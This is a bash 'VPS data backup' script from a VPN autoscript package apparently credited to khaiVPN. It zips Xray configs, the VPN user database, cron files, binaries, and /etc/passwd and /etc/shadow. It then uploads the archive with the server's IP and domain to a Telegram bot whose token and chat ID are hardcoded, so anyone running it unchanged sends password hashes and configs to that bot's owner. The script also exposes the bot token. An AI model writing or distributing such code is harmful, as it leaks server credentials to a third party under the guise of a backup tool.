#!/bin/bash
# =========================================
# Quick Setup | vpn autoscript xray
# Edition : vless only + websocket + tls + vision
# SC by khaiVPN
# BACKUP TOOLS BY khaiVPN
# =========================================

red='\e[1;31m'
green='\e[0;32m'
purple='\e[0;35m'
orange='\e[0;33m'
NC='\e[0m'
clear

IPVPS=$(curl -s https://checkip.amazonaws.com)
date=$(date +"%d-%m-%Y-%H:%M:%S")
domain=$(cat /root/yoloautosc/domain)

# TOTAL ACC XRAYS WS & XTLS

tvless=$(grep -c -E "^### $user" "/usr/local/etc/xray/vless.json")
ttxtls=$(grep -c -E "^### $user" "/usr/local/etc/xray/config.json")


Total_User=$(($tvless + $ttxtls))

clear
echo " VPS Data Backup By khaiVPN "
sleep 1
echo -e "[ ${green}INFO${NC} ] Processing . . . "
mkdir -p /root/backup
sleep 1
clear
echo " Please Wait VPS Data Backup In Progress . . . "
cp -r /usr/local/etc/xray/*.json /root/backup/ >/dev/null 2>&1
cp -r /root/domain /root/backup/ &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html
cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
cp -r /etc/crontab /root/backup/crontab &> /dev/null
cp /etc/xray/user.db /root/backup/user.db.bak &> /dev/null
cp /etc/passwd /root/backup/passwd.bak &> /dev/null
cp /etc/shadow /root/backup/shadow.bak &> /dev/null
mkdir -p /root/backup/bin
cp -r /usr/local/bin/* /root/backup/bin/ &> /dev/null

cd /root
zip_filename="backup-$domain.zip"
zip -r $zip_filename /root/backup > /dev/null 2>&1

# Replace the following values with your own Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN=7449633234:AAEqUHsYNL74U_6mtadoTITPmKNV2Fwfds4
TELEGRAM_CHAT_ID=5047657342

# Use the following URL to send a file to Telegram using the bot API
TELEGRAM_API_URL="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument"

# caption for the backup file
CAPTION="
SERVER IP:$IPVPS
CREATED ON:$date
DOMAIN:$domain
Total ID: $Total_User"

# Send the backup file to Telegram with the zip file name as caption
curl -s -F "chat_id=${TELEGRAM_CHAT_ID}" -F "document=@/root/${zip_filename}" -F "caption=${CAPTION}" "${TELEGRAM_API_URL}" > /dev/null

clear
echo -e "\033[1;37mVPS Data Backup By YOLONET\033[0m"
echo ""
echo "Backup has been sent to Telegram bot."
rm -rf /root/backup
rm -r /root/${zip_filename}
echo ""
read -p "$( echo -e "Press ${orange}[ ${NC}${green}Enter${NC} ${CYAN}]${NC} Back to menu . . .") "
clear
